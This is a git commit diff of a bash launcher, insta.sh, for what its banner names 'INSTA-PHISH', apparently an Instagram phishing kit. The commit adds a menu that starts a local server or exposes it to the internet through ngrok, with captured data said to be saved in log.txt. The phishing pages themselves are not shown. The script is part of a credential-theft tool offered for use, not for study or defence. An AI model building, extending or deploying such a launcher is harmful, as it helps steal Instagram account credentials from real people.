4d81444420a4332efa0e7c609732fc777ec39366
i'm vector from indonesia <130651966+bimasopan@users.noreply.github.com>
2023-12-22 11:20:35 +0700

    Update insta.sh
    menambahkan instalasi ngrok dan option

--- insta.sh
+++ insta.sh
@@ -1,9 +1,7 @@
 #!/bin/bash
 
-
-
 function program_berhenti {
-    echo "result: result.txt"
+    echo "data saved in log.txt"
 }
 trap program_berhenti SIGINT SIGTERM
 
@@ -11,17 +9,33 @@ trap program_berhenti SIGINT SIGTERM
 echo "wait a moment...";
 sleep 3
 clear
+bash template/cek.sh
 echo -e "\033[31m██ ███    ██ ███████ ████████  █████        ██████  ██   ██ ██ ███████ ██   ██\033[0m"
+sleep 2
 echo -e "\033[31m██ ████   ██ ██         ██    ██   ██       ██   ██ ██   ██ ██ ██      ██   ██\033[0m"
+sleep 2
 echo -e "\033[31m██ ██ ██  ██ ███████    ██    ███████ █████ ██████  ███████ ██ ███████ ███████\033[0m"
+sleep 2
 echo -e "\033[97m██ ██  ██ ██      ██    ██    ██   ██       ██      ██   ██ ██      ██ ██   ██\033[0m"
+sleep 2
 echo -e "\033[97m██ ██   ████ ███████    ██    ██   ██       ██      ██   ██ ██ ███████ ██   ██\033[0m"
 echo "==============================================================================="
-echo "example: port: 8080";
-echo -n "port: ";
-read port;
-echo "================================================================================"
-php -S localhost:$port
+echo "option: [0-1]"
+echo "[0] run the server"
+echo "[1] run the ngrok server"
+echo -n "[+]> "
+read option;
+clear
+echo "starting server..."
+sleep 3
+clear
+if [ "$option" -eq 0 ];then
+   npm run main
+else
+   ./server.sh
+#    xterm -e php -S localhost:$port & gnome-terminal -- bash -c 'ngrok http 80;exec bash'
+#    gnome-terminal -- bash -c 'ngrok http 80;exec bash'
+fi
 program_berhenti
 
 
